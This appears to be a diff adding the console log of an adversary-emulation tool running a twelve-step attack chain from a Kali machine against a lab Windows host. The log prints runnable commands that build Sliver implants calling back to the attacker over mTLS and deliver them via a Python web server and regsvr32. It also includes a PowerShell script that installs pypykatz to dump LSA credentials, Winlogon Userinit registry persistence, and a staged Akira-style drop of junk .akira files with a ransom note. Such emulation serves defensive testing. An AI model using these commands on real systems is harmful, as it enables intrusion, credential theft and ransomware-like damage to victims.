@@ -1,0 +1,303 @@
+┌──(env_aurora-executor)─(kali㉿kali)-[~/Desktop/Aurora-executor-demo/run-20260715T033724Z-78114f34/chain-003]
+└─$ python attack_chain.py --params attack_chain.params.yml
+╭──────────────── Hello ────────────────╮
+│ 🎯 Welcome to Attack Execution Wizard │
+╰───────────── Let's Begin ─────────────╯
+
+📌[Sliver Console] Step 1
+
+📌[Name] Build DLL Sliver implant
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the attacker machine
+➤ Enter value for LHOST (current: '192.168.56.43' , required: True): 
+ Parameter Input
+  Parameter: LPORT
+  Description: listening port of the attacter machine
+➤ Enter value for LPORT (current: 8443 , required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the generated payload
+➤ Enter value for SAVE_PATH (current: '/home/kali/Desktop/Aurora-executor-demo/sliver_save/chain_sl.dll' , required: True): 
+
+[Sliver Console] Commands to run (one per line, copy each separately):
+  sliver > generate --mtls 192.168.56.43:8443 --os windows --arch 64bit --format shared --save /home/kali/Desktop/Aurora-executor-demo/sliver_save/chain_sl.dll
+  sliver > mtls --lport 8443
+  ⚠ This step requires manual Sliver console interaction.
+Have you completed this Sliver console step? [y/n] (y): 
+
+📌[Human] Step 2
+
+📌[Name] Simulate the victim download a file on its machine
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the http file server (typically the attacker machine)
+➤ Enter value for LHOST (current: '192.168.56.43' , required: True): 
+ Parameter Input
+  Parameter: LPORT
+  Description: port of the http file server
+➤ Enter value for LPORT (current: 8000 , required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the downloaded payload
+➤ Enter value for SAVE_PATH (current: 'C:\\Users\\Public\\chain_sl.dll' , required: True): 
+
+⚠ Human action required:
+╭───────────────────────────────────── Manual Step ──────────────────────────────────────╮
+│ (This step needs human interaction and (temporarily) cannot be executed automatically) │
+│ (On attacker's machine)                                                                │
+│ python -m http.server 8000                                                             │
+│                                                                                        │
+│ (On victim's machine)                                                                  │
+│ 1. Open 192.168.56.43:8000 in the browser                                              │
+│ 2. Navigate to the path of the file on the attacker's machine                          │
+│ 3. Download the file to C:\Users\Public\chain_sl.dll                                   │
+│                                                                                        │
+╰────────────────────────────────────────────────────────────────────────────────────────╯
+⏸  Have you completed this manual step? [y/n] (y): 
+
+📌[Human] Step 3
+
+📌[Name] Simulate the victim execute a DLL file on its machine
+ Parameter Input
+  Parameter: DLL_PATH
+  Description: Saved path of the DLL file
+  ✓ Using stored value: C:\Users\Public\chain_sl.dll
+
+⚠ Human action required:
+╭───────────────────────────────────── Manual Step ──────────────────────────────────────╮
+│ (This step needs human interaction and (temporarily) cannot be executed automatically) │
+│ (On victim's machine, use PowerShell or Command Prompt)                                │
+│ regsvr32 C:\Users\Public\chain_sl.dll                                                  │
+│                                                                                        │
+╰────────────────────────────────────────────────────────────────────────────────────────╯
+⏸  Have you completed this manual step? [y/n] (y): 
+
+📌[Session Check] Step 4
+📌[Name] Execute a Sliver Implant Payload
+[Session Check] Polling for new sliver session (30s)…
+  Previously known sessions: (none)
+  Newly detected session(s):
+    [4643cc29-ca16-419c-82c8-9aff66bba720] PLASTIC_STORY@WIN-BASE — WIN-BASE\useradmin (windows)
+➤ Session id to accept (default: 4643cc29-ca16-419c-82c8-9aff66bba720, or 'n' to abort chain): 
+
+📌[Sliver Executor] Step 5
+
+📌[Name] User Context Verification
+ Parameter Input
+  Parameter: executor
+  Description: The session ID of the active Sliver connection.
+Available Sessions:
+[0] 4643cc29-ca16-419c-82c8-9aff66bba720 - PLASTIC_STORY@WIN-BASE - WIN-BASE\useradmin(windows)
+Select session number: 0
+
+[Sliver Executor] Executing: whoami
+Keep going with the next attack step? [y/n] (y): 
+Exec Stdout: "win-base\useradmin\r\n"
+Pid: 396
+
+
+📌[Sliver Console] Step 6
+
+📌[Name] Build the executable file of a Sliver implant (for Windows)
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the attacker machine
+➤ Enter value for LHOST (current: '192.168.56.43' , required: True): 
+ Parameter Input
+  Parameter: LPORT
+  Description: listening port of the attacter machine
+➤ Enter value for LPORT (current: 8443 , required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the generated payload
+➤ Enter value for SAVE_PATH (current: '/home/kali/Desktop/Aurora-executor-demo/sliver_save/chain_sl2.exe' , required: True): 
+
+[Sliver Console] Commands to run (one per line, copy each separately):
+  sliver > generate --mtls 192.168.56.43:8443 --os windows --arch 64bit --format exe --save /home/kali/Desktop/Aurora-executor-demo/sliver_save/chain_sl2.exe
+  sliver > mtls --lport 8443
+  ⚠ This step requires manual Sliver console interaction.
+Have you completed this Sliver console step? [y/n] (y): 
+
+📌[Human] Step 7
+
+📌[Name] Simulate the victim download and execute malicious payload file as Admin (Root)
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the http file server (typically the attacker machine)
+➤ Enter value for LHOST (current: '192.168.56.43' , required: True): 
+ Parameter Input
+  Parameter: LPORT
+  Description: port of the http file server
+➤ Enter value for LPORT (current: 8000 , required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the downloaded payload
+➤ Enter value for SAVE_PATH (current: 'C:\\Users\\Public\\chain_sl2.exe' , required: True): 
+
+⚠ Human action required:
+╭───────────────────────────────────── Manual Step ──────────────────────────────────────╮
+│ (This step needs human interaction and (temporarily) cannot be executed automatically) │
+│ (On attacker's machine)                                                                │
+│ python -m http.server 8000                                                             │
+│                                                                                        │
+│ (On victim's machine)                                                                  │
+│ 1. Open 192.168.56.43:8000 in the browser                                              │
+│ 2. Navigate to the path of the target payload file                                     │
+│ 3. Download the payload file                                                           │
+│ 4. Execute the payload file to C:\Users\Public\chain_sl2.exe as Admin (Root)           │
+│                                                                                        │
+╰────────────────────────────────────────────────────────────────────────────────────────╯
+⏸  Have you completed this manual step? [y/n] (y): 
+
+📌[Session Check] Step 8
+📌[Name] Execute a Sliver Implant Payload
+[Session Check] Polling for new sliver session (30s)…
+  Previously known sessions: ['4643cc29-ca16-419c-82c8-9aff66bba720']
+  Newly detected session(s):
+    [4e046799-6f92-40dc-82a0-5782b775d962] POWERFUL_SPHERE@WIN-BASE — WIN-BASE\useradmin (windows)
+➤ Session id to accept (default: 4e046799-6f92-40dc-82a0-5782b775d962, or 'n' to abort chain): 
+
+📌[Sliver Session Derive] Step 9
+📌[Name] Execute PowerShell Command
+ Parameter Input
+  Parameter: executor_parent
+  Description: The session ID of the active Sliver connection.
+Available Sessions:
+[0] 4643cc29-ca16-419c-82c8-9aff66bba720 - PLASTIC_STORY@WIN-BASE - WIN-BASE\useradmin(windows)
+[1] 4e046799-6f92-40dc-82a0-5782b775d962 - POWERFUL_SPHERE@WIN-BASE - WIN-BASE\useradmin(windows)
+Select session number: 1
+  ↳ Derived executor_derived executor from Sliver session 4e046799-6f92-40dc-82a0-5782b775d962
+
+📌[Powershell Executor] Step 10
+
+📌[Name] Registry parse with pypykatz
+ Parameter Input
+  Parameter: executor
+  Description: The Powershell session ID used to invoke pypykatz.
+  ✓ Using stored value: 4e046799-6f92-40dc-82a0-5782b775d962
+ Parameter Input
+  Parameter: venv_path
+  Description: Target-side path to a Python venv containing pypykatz.
+➤ Enter value for venv_path (current: 'C:\\Users\\Public\\venv_pypykatz' , required: True): 
+
+[Powershell Executor] PowerShell script to run via Sliver:
+  $venv = "C:\Users\Public\venv_pypykatz"
+if (-not (Test-Path "$venv\Scripts\pypykatz.exe")) {
+  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+  if (-not (Get-Command py -ErrorAction Ignore)) {
+    $pySetup = "$env:TEMP\python_setup.exe"
+    Invoke-WebRequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe" -OutFile $pySetup
+    Start-Process $pySetup -ArgumentList '/quiet','InstallAllUsers=1','PrependPath=1' -Wait
+  }
+  py -m venv $venv
+  & "$venv\Scripts\pip.exe" install --no-cache-dir pypykatz | Out-Null
+}
+& "$venv\Scripts\pypykatz.exe" live lsa
+
+
+Run this script? [y/n] (y): 
+[Powershell Executor] Running…
+Executing PowerShell script via -EncodedCommand (647 bytes)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  ✗ Step 10 failed: Registry parse with pypykatz
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<AioRpcError of RPC that terminated with:
+        status = StatusCode.UNKNOWN
+        details = "implant timeout"
+        debug_error_string = "UNKNOWN:Error received from peer  {grpc_message:"implant timeout", grpc_status:2, 
+created_time:"2026-07-17T21:31:37.262093628-05:00"}"
+>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+
+📌[Powershell Executor] Step 11
+
+📌[Name] HKLM - Append Command to Winlogon Userinit KEY Value
+ Parameter Input
+  Parameter: executor
+  Description: The Powershell session ID used to modify Winlogon Userinit.
+  ✓ Using stored value: 4e046799-6f92-40dc-82a0-5782b775d962
+ Parameter Input
+  Parameter: payload
+  Description: Command / path appended to the Winlogon Userinit value.
+➤ Enter value for payload (current: 'C:\\Windows\\System32\\notepad.exe' , required: True): 
+
+[Powershell Executor] PowerShell script to run via Sliver:
+  $oldvalue = Get-ItemPropertyValue -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit"
+Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit-backup" -Value "$oldvalue"
+$newvalue = $oldvalue + " C:\Windows\System32\notepad.exe"
+Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "$newvalue"
+
+
+Run this script? [y/n] (y): 
+[Powershell Executor] Running…
+Executing PowerShell script via -EncodedCommand (469 bytes)
+Status: 0
+Pid: 896
+
+📌[Powershell Executor] Step 12
+
+📌[Name] Akira Ransomware drop Files with .akira Extension and Ransomnote
+ Parameter Input
+  Parameter: executor
+  Description: The Powershell session ID used to drop the .akira files and ransom note.
+  ✓ Using stored value: 4e046799-6f92-40dc-82a0-5782b775d962
+ Parameter Input
+  Parameter: file_count
+  Description: Number of .akira artefact files to drop.
+➤ Enter value for file_count (current: 20 , required: True): 
+ Parameter Input
+  Parameter: output_dir
+  Description: Target-side directory where .akira files are written.
+➤ Enter value for output_dir (current: 'C:\\Users\\Public' , required: True): 
+ Parameter Input
+  Parameter: ransom_note_name
+  Description: Ransom-note filename dropped on the user's desktop.
+➤ Enter value for ransom_note_name (current: 'akira_readme.txt' , required: True): 
+
+[Powershell Executor] PowerShell script to run via Sliver:
+  1..20 | ForEach-Object {
+  $out = New-Object byte[] 1073741
+  (New-Object Random).NextBytes($out)
+  [IO.File]::WriteAllBytes("C:\Users\Public\test.$_.akira", $out)
+}
+"Hi friends" | Out-File -Append "$env:UserProfile\Desktop\akira_readme.txt"
+"Your files have been encrypted." | Out-File -Append "$env:UserProfile\Desktop\akira_readme.txt"
+
+
+Run this script? [y/n] (y): 
+[Powershell Executor] Running…
+Executing PowerShell script via -EncodedCommand (381 bytes)
+Status: 0
+Pid: 2536
+
+══════════════════════════════════════════════════════════════════════
+  Attack Chain Run Summary
+══════════════════════════════════════════════════════════════════════
+Step  Name                                                                             Start                    End                      Duration  Status
+   1  Build DLL Sliver implant                                                         2026-07-18 02:24:29 UTC  2026-07-18 02:26:01 UTC    1m 31s    ✓   
+   2  Simulate the victim download a file on its machine                               2026-07-18 02:26:01 UTC  2026-07-18 02:28:22 UTC    2m 21s    ✓   
+   3  Simulate the victim execute a DLL file on its machine                            2026-07-18 02:28:22 UTC  2026-07-18 02:28:55 UTC     32.3s    ✓   
+   4  Execute a Sliver Implant Payload                                                 2026-07-18 02:28:55 UTC  2026-07-18 02:28:56 UTC      1.3s    ✓   
+   5  User Context Verification                                                        2026-07-18 02:28:56 UTC  2026-07-18 02:28:59 UTC      2.8s    ✓   
+   6  Build the executable file of a Sliver implant (for Windows)                      2026-07-18 02:28:59 UTC  2026-07-18 02:30:04 UTC     1m 5s    ✓   
+   7  Simulate the victim download and execute malicious payload file as Admin (Root)  2026-07-18 02:30:04 UTC  2026-07-18 02:30:58 UTC     54.2s    ✓   
+   8  Execute a Sliver Implant Payload                                                 2026-07-18 02:30:58 UTC  2026-07-18 02:31:00 UTC      1.2s    ✓   
+   9  Execute PowerShell Command                                                       2026-07-18 02:31:00 UTC  2026-07-18 02:31:03 UTC      3.6s    ✓   
+  10  Registry parse with pypykatz                                                     2026-07-18 02:31:03 UTC  2026-07-18 02:31:37 UTC     33.5s    ✗   
+  11  HKLM - Append Command to Winlogon Userinit KEY Value                             2026-07-18 02:31:37 UTC  2026-07-18 02:31:48 UTC     11.4s    ✓   
+  12  Akira Ransomware drop Files with .akira Extension and Ransomnote                 2026-07-18 02:31:48 UTC  2026-07-18 02:31:54 UTC      6.1s    ✓   
+
+  Failed steps (1):
+  ✗ Step 10: Registry parse with pypykatz
+      <AioRpcError of RPC that terminated with:
+        status = StatusCode.UNKNOWN
+        details = "implant timeout"
+        debug_error_string = "UNKNOWN:Error received from peer  {grpc_message:"implant timeout", grpc_status:2, 
+created_time:"2026-07-17T21:31:37.262093628-05:00"}"
+      >
+
+  Total: 12 steps executed (11 ✓, 0 ?, 1 ✗) in 7m 25s
+══════════════════════════════════════════════════════════════════════
